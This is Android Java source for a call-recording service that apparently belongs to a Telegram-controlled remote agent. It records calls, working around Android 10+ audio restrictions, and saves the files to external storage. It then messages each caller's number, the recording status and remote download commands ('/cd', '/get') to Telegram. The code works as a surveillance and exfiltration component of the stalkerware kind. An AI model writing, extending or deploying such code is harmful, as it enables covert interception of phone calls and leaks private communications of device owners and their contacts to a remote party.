package com.thunderx.telegramagent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallRecorder extends Service {

    private static final String TAG = "CallRecorder";
    private static final String CHANNEL_ID = "call_rec_channel";
    private static final int NOTIF_ID = 1001;

    private static MediaRecorder recorder;
    private static File currentFile;
    private static boolean isRecording = false;
    private static boolean recordingEnabled = true;

    // Tracks which audio source actually worked (for logging / debugging)
    private static String activeSource = "none";

    // ==========================================================
    //                   RECORDINGS FOLDER
    // ==========================================================
    public static File getRecordingsDir() {
        File dir = new File(Environment.getExternalStorageDirectory(), "CallRecords");
        if (!dir.exists()) {
            boolean ok = dir.mkdirs();
            Log.d(TAG, "Created dir: " + ok + " -> " + dir.getAbsolutePath());
        }
        return dir;
    }

    // ==========================================================
    //                  ENABLE / DISABLE
    // ==========================================================
    public static void enableRecording(boolean enable) {
        recordingEnabled = enable;
        if (enable) {
            TelegramAgentService.sendMessage("✅ Call recording *ENABLED*");
        } else {
            TelegramAgentService.sendMessage("⏸️ Call recording *DISABLED*");
        }
    }

    public static boolean isRecordingEnabled() {
        return recordingEnabled;
    }

    // ==========================================================
    //                     LIFECYCLE
    // ==========================================================
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // CRITICAL: startForeground() must be called within 5 seconds
        startForegroundNotification();

        if (intent == null) {
            return START_NOT_STICKY;
        }

        String action = intent.getStringExtra("action");
        String number = intent.getStringExtra("number");

        Log.d(TAG, "onStartCommand: action=" + action + " number=" + number);

        if ("start".equals(action)) {
            startRecording(number);
        } else if ("stop".equals(action)) {
            stopRecording();
            stopForeground(true);
            stopSelf();
        }

        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        if (isRecording) {
            stopRecording();
        }
    }

    // ==========================================================
    //              FOREGROUND NOTIFICATION
    // ==========================================================
    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Call Recorder",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Call recording service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Recorder")
                .setContentText(isRecording ? "Recording..." : "Monitoring calls")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();

        // Android 10+ requires explicit foreground service type
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(NOTIF_ID, notification);
        }
    }

    // ==========================================================
    //                  START RECORDING
    // ==========================================================
    private void startRecording(String number) {
        if (isRecording) {
            Log.d(TAG, "Already recording, skipping");
            return;
        }

        if (!recordingEnabled) {
            Log.d(TAG, "Recording disabled, skipping");
            TelegramAgentService.sendMessage("⏸️ Recording is disabled. Use `/rec_on`");
            return;
        }

        try {
            // ----- Prepare output file -----
            File dir = getRecordingsDir();
            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String safeNumber = (number == null || number.isEmpty())
                    ? "Unknown" : number.replaceAll("[^0-9+]", "");
            if (safeNumber.isEmpty()) safeNumber = "Unknown";

            currentFile = new File(dir, "call_" + safeNumber + "_" + ts + ".m4a");

            // ----- Create recorder -----
            recorder = new MediaRecorder();

            // ==========================================================
            //  AUDIO SOURCE SELECTION
            //  - Android 9 and below:  VOICE_CALL   (both sides)
            //  - Android 10+:          VOICE_CALL blocked by Google,
            //                          fall back to MIC (own voice only)
            //                          or VOICE_RECOGNITION (some OEMs)
            // ==========================================================
            boolean sourceSet = false;
            String chosenSource = "none";

            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                // ---------- Android 9 (API 28) and below ----------
                // VOICE_CALL captures BOTH sides of the call.
                try {
                    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                    sourceSet = true;
                    chosenSource = "VOICE_CALL (both sides)";
                    Log.d(TAG, "Android <=9: using VOICE_CALL");
                } catch (Exception e) {
                    Log.d(TAG, "VOICE_CALL failed: " + e.getMessage());
                }
            }

            if (!sourceSet && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // ---------- Android 10+ ----------
                // VOICE_CALL is blocked. Try VOICE_RECOGNITION first
                // (works on some Xiaomi / Samsung / OnePlus devices),
                // then fall back to MIC.
                try {
                    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
                    sourceSet = true;
                    chosenSource = "VOICE_RECOGNITION (own voice, best-effort)";
                    Log.d(TAG, "Android 10+: using VOICE_RECOGNITION");
                } catch (Exception e) {
                    Log.d(TAG, "VOICE_RECOGNITION failed: " + e.getMessage());
                }
            }

            if (!sourceSet) {
                // ---------- Universal fallback: MIC ----------
                try {
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    sourceSet = true;
                    chosenSource = "MIC (own voice only)";
                    Log.d(TAG, "Fallback: using MIC");
                } catch (Exception e) {
                    Log.d(TAG, "MIC failed: " + e.getMessage());
                }
            }

            if (!sourceSet) {
                throw new Exception("No usable audio source on this device");
            }

            activeSource = chosenSource;
            Log.d(TAG, "Audio source selected: " + chosenSource);

            // ----- Output format (MPEG_4 + AAC works everywhere) -----
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(96000);
            recorder.setOutputFile(currentFile.getAbsolutePath());

            // ----- Start -----
            recorder.prepare();
            recorder.start();
            isRecording = true;

            Log.d(TAG, "Recording started: " + currentFile.getName());

            // Notify via Telegram
            String qualityNote;
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                qualityNote = "both sides ✅";
            } else {
                qualityNote = "own voice only (Android 10+ restriction)";
            }

            TelegramAgentService.sendMessage(
                    "📞 *Call recording started*\n" +
                    "Number: `" + safeNumber + "`\n" +
                    "Source: " + chosenSource + "\n" +
                    "_Note: " + qualityNote + "_");

        } catch (Exception e) {
            Log.e(TAG, "Start failed: " + e.getMessage(), e);
            TelegramAgentService.sendMessage("❌ Call record failed: " + e.getMessage());
            isRecording = false;
            if (recorder != null) {
                try { recorder.release(); } catch (Exception ignored) {}
                recorder = null;
            }
        }
    }

    // ==========================================================
    //                    STOP RECORDING
    // ==========================================================
    private void stopRecording() {
        if (!isRecording || recorder == null) {
            Log.d(TAG, "Not recording, nothing to stop");
            return;
        }

        try {
            recorder.stop();
        } catch (Exception e) {
            Log.e(TAG, "recorder.stop() failed: " + e.getMessage());
        }

        try {
            recorder.release();
        } catch (Exception ignored) {}

        recorder = null;
        isRecording = false;

        if (currentFile != null && currentFile.exists()) {
            long sizeKb = currentFile.length() / 1024;
            Log.d(TAG, "Saved: " + currentFile.getAbsolutePath() + " (" + sizeKb + " KB)");

            TelegramAgentService.sendMessage(
                    "📞 *Call recording saved*\n" +
                    "File: `" + currentFile.getName() + "`\n" +
                    "Size: " + sizeKb + " KB\n" +
                    "Source: " + activeSource + "\n\n" +
                    "Download:\n" +
                    "`/cd CallRecords`  →  `/get " + currentFile.getName() + "`");

            // Schedule auto-cleanup
            try {
                CallCleanupWorker.scheduleCleanup(getApplicationContext());
            } catch (Exception ignored) {}

        } else {
            Log.d(TAG, "No recording file to save");
        }
    }
}